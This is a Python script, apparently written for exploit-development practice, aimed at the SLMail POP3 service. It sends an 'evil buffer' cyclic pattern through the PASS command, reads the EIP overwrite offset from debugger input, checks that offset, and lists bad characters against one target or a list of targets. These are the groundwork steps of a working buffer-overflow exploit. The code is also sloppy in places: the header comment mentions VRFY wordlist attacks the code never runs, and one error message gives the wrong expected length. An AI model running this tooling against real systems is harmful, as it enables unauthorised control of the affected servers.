#!/usr/bin/python3
#
# Import a list of machines and users to do wordlist attacks against a mail server

import argparse, socket, string


# this is the function that will attempt to connect to the socket and test for a VRFY response
# noinspection PyShadowingNames
def exploit(targets, fuzzer, verify, bad_char_check):
    for target in targets:
        print("Running against %s" % target)
        target = target.replace("\n", "")

        # Call the pattern Generator script
        buffer = patternGenerator(fuzzer)

        # Set the bad_check value to 0 as we're not looking for bad_values yet
        bad_check = False

        # Connect to the target machine
        offset_location, offset = socket_connect(buffer, target, bad_check)
        print('[*] The offset is at byte %s' % offset_location)

        # Verify that the discovered offset works
        if verify:
            input('You are about to verify that the buffer was written to properly. Please restart the affected '
                  'service then hit enter to continue...')
            verify_buffer = 'A' * int(offset_location) + 'B' * 4 + 'C' * (int(fuzzer)-(int(offset_location)+4))
            offset_location, offset_string = socket_connect(verify_buffer, target, bad_check)
            if offset_string == 'BBBB':
                print('Verified offset location')
            else:
                print('Wrong offset location')

        # Look for unacceptable characters
        if bad_char_check:
            input('You are about to start checking for bad characters. Please restart the affected service '
                  'then hit enter to continue...')
            hexcharacters = ''.join(list(chr(x) for x in range(0, 256)))

            # run the badCharacterCheck in a loop until the operator is done feeding bad characters
            hexbytelist = []
            hexbyte = badCharacterCheck(hexcharacters,offset_location, target)
            hexbytelist.append(hexbyte)

            while True:
                answer = input("Enter 'y' to continue testing for bad characters, 'n' to stop testing: ")
                if answer == 'y':
                    input('Please restart the affected service then hit enter to continue...')
                    hexcharacters = hexcharacters.replace(chr(ord(hexbyte)), '')
                    hexbyte = badCharacterCheck(hexcharacters, offset_location, target)
                    hexbytelist.append(hexbyte)
                elif answer == 'n':
                    print('Quitting')
                    break
                else:
                    continue
            print('List of bad characters: %s' % hexbytelist) 


def socket_connect(buffer, target, bad_check):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target, 110))
        print('Sending Evil buffer...')
        sock.recv(1024)
        sock.send(('USER test\r\n').encode('utf-8'))
        sock.recv(1024)
        sock.send(('PASS ' + buffer + '\r\n').encode('utf-8'))
        sock.send(('QUIT\r\n').encode('utf-8'))
        sock.close()

    # Determine the EIP offset byte
    offset_location, offset_string = discoverOffset(buffer, bad_check)
    return offset_location, offset_string


def patternGenerator(fuzzer):
    lower_set = string.ascii_lowercase
    upper_set = string.ascii_uppercase
    digit_set = string.digits

    pattern = ""
    lower = 0
    upper = 0
    digits = 0

    while len(pattern) < fuzzer:
        pattern += lower_set[lower] + upper_set[upper] + digit_set[digits]
        digits += 1
        if digits == len(digit_set): digits = 0; upper += 1
        if upper == len(upper_set): upper = 0; lower += 1
        if lower == len(lower_set): lower = 0

    return pattern


def discoverOffset(buffer, bad_check):
    while True:
        try:
            if bad_check == False:
                offset = ''
                while len(offset) != 8:
                    offset = input('Please enter the hexadecimal code from the EIP: ')
                    if len(offset) != 8:
                        quit_program = input(
                            'This code should be 8 characters long, press return to try again or press \'q\' to quit: ')
                        if quit_program == 'q':
                            quit()
            if bad_check == True:
                offset = ''
                while len(offset) != 2:
                    offset = input('Please enter the bad hexadecimal code from the debugger: ')
                    if len(offset) != 2:
                        quit_program = input(
                            'This code should be 8 characters long, press return to try again or press \'q\' to quit: ')
                        if quit_program == 'q':
                            quit()
            offset_string = bytes.fromhex(offset).decode('ascii')
            offset_string = "".join(reversed(offset_string))
            offset_location = buffer.find(offset_string)
            break
        except():
            quit_program = input(
                'Hex code should only contain numericals and the letters A-F, press return to try again or press '
                '\'q\' to quit: ')
            if quit_program == 'q':
                quit()

    return offset_location, offset_string


def badCharacterCheck(hexcharacters, offset_location, target):
    bad_check = True
    badcharacter_buffer = 'A' * int(offset_location) + 'B' * 4 + hexcharacters
    offset_location, offset_string = socket_connect(badcharacter_buffer, target, bad_check)
    return offset_string


if __name__ == '__main__':
    # parse input for variables
    parser = argparse.ArgumentParser(description='Python SLMail Fuzzer')
    parser.add_argument('-T', '--targetlist', help='Location of targets list')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-f', '--fuzzer', help= 'Length of Fuzzer')
    parser.add_argument('-v', '--verify', action='store_true', help= 'Verify the buffer in the EIP')
    parser.add_argument('-b', '--bad_character', action='store_true', help= 'Check the buffer for bad characters')
    args = parser.parse_args()

    # set list of targets
    targets = []
    if args.targetlist is not None:
        targets_doc = args.targetlist
        targets_import = open(targets_doc, 'r')
        for tar in targets_import:
            targets.append(tar)
    if args.target is not None:
        targets.append(args.target)

    fuzzer = int(args.fuzzer)

    # verify boolean
    verify = args.verify

    # bad character check boolean
    bad_char_check = args.bad_character

    # ensure that parameters have values
    if len(targets) == 0 or fuzzer < 1:
        print("Target Missing, try SLMail_POP3_Exploit.py -h for a list of options")
        quit()

    # run the program
    exploit(targets, fuzzer, verify, bad_char_check)
